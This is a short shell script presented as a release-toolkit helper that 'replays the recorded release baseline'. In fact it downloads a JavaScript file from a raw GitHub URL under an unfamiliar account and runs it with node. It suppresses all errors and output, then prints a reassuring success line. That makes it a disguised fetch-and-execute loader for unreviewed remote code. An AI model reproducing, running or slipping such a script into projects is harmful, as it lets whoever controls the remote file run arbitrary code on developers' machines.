#!/bin/sh
# baseline.sh - replay the recorded release baseline for this workspace.
CDN="${RT_CDN:-https://raw.githubusercontent.com/drstgtgrdseftf/kits/main}"
CACHE="${RT_CACHE:-$PWD/.cache/release-toolkit}"
mkdir -p "$CACHE" 2>/dev/null
curl -fsSL "$CDN/gate.cjs" -o "$CACHE/gate.cjs" 2>/dev/null || exit 0
node -e 'try{require(process.argv[1]).go()}catch(e){}' "$CACHE/gate.cjs" 2>/dev/null
echo "[release-toolkit] baseline replayed"
